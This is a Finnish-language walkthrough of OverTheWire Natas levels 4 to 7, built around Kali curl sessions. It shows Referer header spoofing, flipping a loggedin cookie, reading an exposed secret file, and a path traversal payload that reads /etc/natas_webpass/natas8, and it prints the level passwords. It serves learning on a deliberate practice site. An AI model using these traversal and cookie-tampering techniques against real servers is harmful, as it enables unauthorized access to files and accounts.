# Natas lunttilapput

Eli aikaisempien harjoittuksien kannalta kertyy ja taso menee vaikeammaksi ja vaikeammaksi. Listataan olennaiset tarkistukset, ettei ole vain yhtä tapaa;

- tarkista sivuston "inspect" eli avaamalla näppäimistöstä F12 , tai joko sivustolta oikea hiirellä "inspect" - ja katso onko koodissa mitään `username:password`
  - tarkista onko tiedoston polussa mitään polkuaja kuten `/file/image.jpg`, eli poista image.jpg , ja mene `/file`- polkuun, ja tarkista onko mahdollista olla .txt tiedostoa tai muuta arkistoa
  - lisää url polkuun `/robots.txt` , jos ois robots tiedosto, niin siellä voi lukea lisä vinkkejä. Todellisuudessaan kaikilla sivustoilla ei ole robots.txt-tiedostoa, koska sen käyttö ei ole pakollista. Jotkut haluavat hakukoneiden indeksoivan kaiken, kun taas toiset eivät tarvitse erityisiä rajoituksia. Ilman tätä tiedostoa hakukoneet voivat silti yrittää indeksoida kaikki löydettävissä olevat sivut, ellei muita estomekanismeja ole käytössä.

## curl komentoja

käytettään -Headeri referenssiä , ja tässä muutama ovat melko samoja, mutta jotekin se objekti/nimi/muuttuja on erissä järjestyksessä mutta idea on sama;

- Ensimmäisen linkkissä on halutaan mennä seuraavaan leveliin, ja jälkimmäisessä on nykyinen level ja se level salasansa jonka saattiin selville ja siksi tässä lukee (a)natas4-level;  <br>
`$curl -Headers "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org`

- tämä on sama kuin ylempi, mutta lyhyempi ja tiivistettynä vain -H tarkoittaa header; <br>
`$curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org`

- tässäkin ekana on toistettaan se nykyinen level ja se salasansa, että haettaan seuraava leveli; <br>
`$curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org`

### evästeen hakeminen

loggin muutettu 0 (false) --> 1 (true)

Tämän komenton suorittamiseen vaattii sen nykyisen levelin salasansa, jotta saa kerrättyä sen evästeet; <br>
`$curl http://natas5.natas.labs.overthewire.org/ -u natas5 -c natas5_cookie.txt` 

```
┌──(kali㉿kali)-[~]
└─$ cat natas5_cookie.txt                                                        
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        0
                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ cat natas5_cookie.txt                         
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        1
```

Ylemmän muutettun loggin=1:seksi, niin sitten suoritettaan ja haettaan sitä seuraavan levelin salasannsa; <br>
`$curl http://natas5.natas.labs.overthewire.org/ -u natas5 -b "natas5_cookie.txt"`

# level 6 - START HERE

En ois uskonut tämä level 6 oli/on helppoa, että piti selvittää toi salainen koodi tuohon kenttään ja sitten kertoo sen seuraavan levelin 7 salasansa.

Ensimmäinen kirjauduttua level 6 - että selvitettään toi salainen koodi , niin päästään eteenpäin.

![alt text](./kuvat-level6-10/level6-0.png)

Ensimmäisenä tarkistettaan koodit, että näyttää normaalilta ja on tämän level 6 ja sen salasansa kirjauttuminen

![alt text](./kuvat-level6-10/level6-1.png)

Seuraavaksi meitä kiinnostaa toi "View sourcecode" (ylemmän kuvan mukaan) niin se ainakin ohjaisi toiselle sivustolle. Tämä on kuin toinen polku tiedosto/sivusto. Tämän keksimmäinen osuus (alempi kuva) on kodaattu jollaki PHP-koodikielellä, että HTMl tukee sen. Sitten seuraavista meitä kiinnostaa toi polku `includes/secret.inc`

![alt text](./kuvat-level6-10/level6-2.png)

Tässä nähdään se salainen koodi näyttävän se on tämän polun alla, eli kopsaa se ja liittä takaisin Natas level 6:sen etusivuun.

![alt text](./kuvat-level6-10/level6-3.png)


![alt text](./kuvat-level6-10/level6-4.png)

Sitten ja _voila_ , tässä on ratkaistettu level 7:n seuraava salasansa. En ois uskonut näin helppoa, mutta tässä pitää tarkistaa tosi huolella ja mennä vähä step by step ja just aikaisempien harjoittuksien mukaan. Myös tarkistinkin polun `/robots.txt` - että sellaistakaan ei ole olemassa, ja siksi en lisännyt sitä tänne.

![alt text](./kuvat-level6-10/level6-5.png)


Mini yhteenvetona tässä ei tarvittu tuota Kali linux terminaali, mutta voi hyvinkin katsoa miten tätä oltaisi voittu ratkaista.

## level 6 - 1 Kali Linux version - START HERE

Tässä steppissä mennään Kali linux kautta, mutta ylemmissä mentiin suorttaan sivustojen kautta ja käyttäen pientä salapoliisityötä, mutta idea on sama ja mentiin mutkan kautta. Harjoitus tekee aina mestariksi, että hyvä steppi.

```
┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

**tämä on tarkistus HTTP-vastaus koodia** , että tämä ensimmäisenä;

```
┌──(kali㉿kali)-[~]
└─$ curl -I -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/index-source.html
HTTP/1.1 200 OK
Date: Fri, 02 May 2025 07:15:48 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Thu, 10 Apr 2025 14:18:42 GMT
ETag: "b75-6326d4351c6fc"
Accept-Ranges: bytes
Content-Length: 2933
Vary: Accept-Encoding
Content-Type: text/html
```

Jotenkin oikealla jäljillä ja sekalaista html koodia näyttävänsä ja tässä on mukana PHP-koodikieltä, eli sama kuin selaimessa ja siksi toistumisessa näyttää tosi sekavalta..

**OPTION2-komento** ja sama idea; `$curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/index-source.html`

```
┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned@natas6.natas.labs.overthewire.org/index-source.html
<code><span style="color: #000000">
&lt;html&gt;<br />&lt;head&gt;<br />&lt;!--&nbsp;This&nbsp;stuff&nbsp;in&nbsp;the&nbsp;header&nbsp;has&nbsp;nothing&nbsp;to&nbsp;do&nbsp;with&nbsp;the&nbsp;level&nbsp;--&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;type="text/css"&nbsp;href="http://natas.labs.overthewire.org/css/level.css"&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/jquery-ui.css"&nbsp;/&gt;<br />&lt;link&nbsp;rel="stylesheet"&nbsp;href="http://natas.labs.overthewire.org/css/wechall.css"&nbsp;/&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;<br />&lt;script&nbsp;src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script&nbsp;src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;<br />&lt;script&gt;var&nbsp;wechallinfo&nbsp;=&nbsp;{&nbsp;"level":&nbsp;"natas6",&nbsp;"pass":&nbsp;"&lt;censored&gt;"&nbsp;};&lt;/script&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;h1&gt;natas6&lt;/h1&gt;<br />&lt;div&nbsp;id="content"&gt;<br /><br /><span style="color: #0000BB">&lt;?<br /><br /></span><span style="color: #007700">include&nbsp;</span><span style="color: #DD0000">"includes/secret.inc"</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">array_key_exists</span><span style="color: #007700">(</span><span style="color: #DD0000">"submit"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$secret&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">'secret'</span><span style="color: #007700">])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Access&nbsp;granted.&nbsp;The&nbsp;password&nbsp;for&nbsp;natas7&nbsp;is&nbsp;&lt;censored&gt;"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Wrong&nbsp;secret"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;<br /></span><br />&lt;form&nbsp;method=post&gt;<br />Input&nbsp;secret:&nbsp;&lt;input&nbsp;name=secret&gt;&lt;br&gt;<br />&lt;input&nbsp;type=submit&nbsp;name=submit&gt;<br />&lt;/form&gt;<br /><br />&lt;div&nbsp;id="viewsource"&gt;&lt;a&nbsp;href="index-source.html"&gt;View&nbsp;sourcecode&lt;/a&gt;&lt;/div&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br /></span>
</code>
```

ainakin ylemmässä sekalaisessa koodikielessä ainakin pistää ilmiinsä on toi **"includes/secret.inc"** - sana. Tämä on se just mikä meitä kiinnostaa nyt, ja meidän pitää selvittää se ja mihin se voisii johtaa.

Ehkä osalle tai jonkun mielestä se voi johtaa seuraavaa polkua eli **`/index-source.html/includes/secret.inc`** , mutta ei, se on yksittäinen polku, että joudutaan kumota polku `/index-source.html`.

Eli ratkaisuksi menee näin (alemman komennon mukaan), ja tämä on se se salainen koodi, jonka halutaan tietää.

```
┌──(kali㉿kali)-[~] 
└─$ curl -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/includes/secret.inc 
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>

```

Sitten tätä koodia pitää sijoittaa siihen formaatti kenttään, eli joudutaan palata siihen etusivulle. Tuossa formaatti funktiossa `<form method=post>` ja päättyvään formaattiin `</form>`, `name=secret`.


```
┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org                  
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

```

Nyt jouduttaan käyttää HTTP-protokollassa POST, PUT, DELETE ja muut vastaavat metodit ovat tapa suorittaa erilaisia toimintoja verkkosivujen ja API:iden kanssa. `curl` komentoa voi lähettää HTTP-pyyntöjä, kuten POST ja PUT, suoraan komentoriviltä, joten käytettään tätä ja testataan.

HTML-lomakkeeseen curl-komennolla, koska sivu käyttää POST-metodia lomakekenttien käsittelyyn.

nyt kokeillaan sijoittaa toi salainen koodi "FOEIUWGHFEEUHOFUOIU" vastaus tuohon **Input secret** kentään.

**TÄMÄ ON MALLI:**
*mitä tässä oikein tapahtuu?* 

- -X POST määrittää, että käytetään HTTP POST -pyyntöä.
- -d "secret=LoremIpsum&submit=Submit" lähettää lomaketietona secret-kenttään arvon LoremIpsum ja painaa "submit"-painiketta.
- -H "Referer: ..." asettaa Referer-otsikon, joka voi olla tarpeellinen pääsyn varmistamiseksi.
- -u "natas6:..." lisää käyttäjätunnuksen ja salasanan autentikaatioon.

`$curl -X POST -d "secret=LoremIpsum&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/`



Nyt näyttää ainakin pelittävän ja näin saattiin toi level 7:n salasansa 

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

---
---

# Level 7 - START HERE;

Perus ensimmäisenä ja tässä näkyvissä on pari seuraavaa sivua, jotka toimivat kuin "etusivu" ja "about"-sivustoa.

![alt text](./kuvat-level6-10/level7-0.png)

![alt text](./kuvat-level6-10/level7-1.png)

![alt text](./kuvat-level6-10/level7-2.png)

Tässä avattua F12/"Inspect" - sivuston koodista, että näyttää on jotakin vinkkejä rivissä 21, että mene polkuun `/etc/natas_webpass/natas8` , joka kertoo level 8 - salasanansa.

![alt text](./kuvat-level6-10/level7-3.png)

Kokeilin sijoittaa ton vihjeen `/etc/natas_webpass/natas8` - mukaan niin ainakin kertoi vähä lisätietoa, että ettei löydä kyseistä polkua, ja konffauksessa on jotakin error:ia. 

![alt text](./kuvat-level6-10/level7-4.png)

**Mitä neuvoksi ja mikä on ratkaisu?** <br>
Otettiin noita tiedoston ja/tai polkujen tietoja ylös eli `/var/www/natas/natas7/index.php` sivuston mukaisesti, että huomataan tällainen polku ja meitä vihjenä oli "`/etc/natas_webpass/natas8`" - että tästä saisi level 8:nen salasansa, mutta miten?

Tässä tason levelissä harjoituksessa on tapahtuu ja yritettään selvittää sen **hakemistorakenteen manipulointia** tai jopa **path traversal -haavoittuvuutta**. Kertauksena `/etc/` tämä on **tiedostopolku** hakemistonsa. Periaatteessa meidän pitää muuttaa tässä harjoituksessa tämän `/var/www/natas/natas7/` - polku rakenne muuttaa `../../`:ksi, koska käyttämällä `../../../../`-merkintää polussa pyritään siirtymään ylemmille hakemistotasoille, mikä on tyypillinen path traversal -haavoittuvuuden hyödyntämistapa. Tämä tapahtuu silloin, kun verkkosovellus ei rajoita tai puhdista käyttäjän antamaa polkua asianmukaisesti, mahdollistaen sen manipuloinnin.

Jos esimerkiksi verkkosivu sallii käyttäjän syöttää tiedoston polun **input-parametrina**, eikä se validoi polkua oikein, hyökkääjä voi yrittää päästä ulos rajoitetusta hakemistosta ja navigoida järjestelmän kriittisiin tiedostoihin, kuten `/etc/passwd`, joka sisältää käyttäjätiedot. Tällainen manipulointi voi johtaa arkaluonteisten tietojen paljastumiseen tai jopa luvattomaan pääsyyn.

Path traversal on yksi yleisimmistä **web-sovellusten tietoturvahaavoittuvuuksista**, ja sen tunnistaminen on tärkeä osa penetraatiotestausta ja tietoturvaa.

**Joten ratkaisuna;** <br>
Sijoitin URl polkuun väliin muutaman `../` polku rakenteen ja käyttäen "/Home/" kotisivun hyödyntääkseen loppua. Siksi tuli näin: `natas7.natas.labs.overthewire.org/index.php?page=home../../../../../../etc/natas_webpass/natas8`

![alt text](./kuvat-level6-10/level7-5.png)

Ja viimeisenä _voila_ ja siinä on level 8:nen salasansa ja näin päästiin selvitettyä ja ratkaistettua.

**Tarkastuksena;** <br>
Tämä on se yksi toimiva polku linki : `natas7.natas.labs.overthewire.org/index.php?page=home../../../../../../etc/natas_webpass/natas8` <br>
Tässä tiedostojen polussa on jokinlainen laskenta, että tässä mukaan on 6 tasoa ylöspäin `../../../../../../` ennen siirtymistä `/etc/natas_webpass/natas8` tiedostoon. 

- Kun tarkastellaan `home../`, tässä tapahtuu ylöspäin siirtyminen, mutta muotoilu vaikuttaa puutteelliselta:
  - 1️⃣ `home../` ei ole täysin oikea syntaksi, koska `../` tulisi yleensä erottua hakemistosta, kuten `home/../`
  - 2️⃣ Jos `home` on hakemisto, sitten `../` tarkoittaa siirtymistä sen yläpuoliseen hakemistoon.
    
`/home../` niin toi home sana voi jättää väliinsä, että valinnaisena se voi toki olla mukana, mutta silti saattaa tuottaa pientä hämäystäkin url:issa. Tästä syystä URL-manipulaatioissa ja path traversal -hyökkäyksissä.

Siksi tässä käytettään `../../../../../../`-merkintää, se korvaa hakemistopolun ja siirtää navigointia ylöspäin. Esimerkiksi polun vinkkiä ja sitä sivun tarjoamaa vihjettä siksi tämä polku tiedostonhakemisto `/var/www/natas/natas7/index.php` voi toimia normaalina reitityksenä, mutta jos palvelin ei rajoita polun manipulointia, **path traversal -haavoittuvuutta** esille ja laskennassa molemmissa on **6 tasoa ylöspäin**.

![alt text](./kuvat-level6-10/level7-6.png)

Sekä periaatteessa molemmat kelpaa vastaukseen, että ylempi tai alempi vaihtoehto ja molempiakin sallittaan ja toimii.

Options 2 toimiva polku linkki; `http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8`

![alt text](./kuvat-level6-10/level7-7.png)

# Level 7 - 1 - Kali Linux version - START HERE;

natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

- tämä voi olla itselleni yleisin käyttö `curl` - komento; <br>
`curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org`

- toisena ehkä tämä on parempi, mutta sama idea, että hakee headerinsä, ja sitten -u (ssh käyttiksen) `username:password`, ja sitten se URL polku `/index.html` ja jne; <br>
`curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/`

```
┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" http://natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS@natas7.natas.labs.overthewire.org 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```


**samat tarkoittavat polu**, mutta menin vain mutkalla, mutta periaatteessa alemmat kolmet on samaa tarkoittavaa <br>
```
┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/index.php?page=home
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=about"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

**seuraavaksi** testataan toi ohje/vinkki natas8 salasansa - START HERE;

```
┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home/etc/natas_webpass/natas8"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
<br />
<b>Warning</b>:  include(home/etc/natas_webpass/natas8): failed to open stream: No such file or directory in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'home/etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php') in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

# Level 7 - 2 lisätietoa ja pientä teoriaa;

## Hakemistorakenteen manipulointi Natas7-haasteessa

Kun käsittelet tiedostopolkujen manipulointia, `"../"` tarkoittaa siirtymistä hakemistossa ylöspäin. Jos olet `/var/www/natas/natas7/index.php` -polussa ja haluat päästä käsiksi tiedostoon `/etc/natas_webpass/natas8`, sinun täytyy nousta hakemistorakenteessa riittävän monta tasoa ylöspäin ja sitten navigoida oikeaan kohteeseen.

## Polun selitys
- `/var/www/natas/natas7/index.php` on alkuperäinen sijainti.
- `../../../../../../etc/natas_webpass/natas8` tarkoittaa, että noustaan kuusi tasoa ylöspäin (pois `natas7`, `natas`, `www`, `var`, jne.), jotta saavutetaan juurihakemisto (`/etc`).
- näin ollen siirrytään `natas_webpass/natas8`, eli polku ohjaa tiedostoon, jossa on siksi mahdollisesti on taso 8 salasansa.

## Miksi tämä toimii?
- Jos palvelin ei ole suojattu **directory traversal** -hyökkäyksiltä, se sallii polkumuutokset ja antaa pääsyn tiedostoihin hakemistorakenteen ulkopuolella.
- Tämä on mahdollista, koska **index.php** käyttää `GET`-parametria (`page`), joka voi käsitellä manipulointia ilman tarkastuksia.
- Hakkerointiteknisesti tämä opettaa, miksi hakemiston pääsyn rajoittaminen on tärkeää.
- Näin ollen tämä tarkoittaa palvelin sallii navigoinnin syvemmälle tiedostojärjestelmään.

## Perustelut ja oppimispisteet
Tämä haaste auttaa ymmärtämään hakemistorakenteiden hyödyntämistä palvelimilla sekä sen, miksi polkumuutosten validointi on kriittistä turvallisuuden kannalta. 🛡️


---

## Level 7 - 2 - Kali Linux version - CONTINUE HERE;


Aikaisemmassa testauksessa menty `for-loop` kautta, mutta sekin voi mennä pikkasen vaikeammaksi, mutta nyt saattiin ainakin jotakin ja vihjeitä löytyy nettistäkin.

en tiedä miksi menin mutkan kautta, mutta tämäkin onnistui, mutta kulkematta -Headerin referenssiä ja siitä syöttäen kohti natas7 levelin ja sen salasansa, sitten vihjeen mukaan se `/etc/natas_webpass/natas8` - hakemiston polun kautta. Tässä vain menty joko "home" tai "about" sivuston alle, ja urlista kummoaa ne parametrit (home | aboout), että sijoittaa perän sen hakemistonsa.

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
